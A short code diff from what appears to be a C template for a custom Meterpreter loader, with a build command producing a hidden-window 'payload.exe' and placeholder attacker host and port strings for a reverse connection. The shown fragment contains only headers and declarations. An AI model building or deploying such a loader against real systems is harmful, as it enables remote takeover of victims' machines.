@@ -1,11 +1,14 @@
 // Credits:: astr0baby C template
 // Compile:: i686-w64-mingw32-gcc astrobaby.c -o payload.exe -lws2_32 -mwindows
+// https://astr0baby.wordpress.com/2014/02/12/custom-meterpreter-loader-dll/
 // --
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <winsock2.h>
 #include <windows.h>
+
+// UUID-RANDOM
 
 unsigned char server[]="LhOsT";
 unsigned char serverp[]="lPoRt";
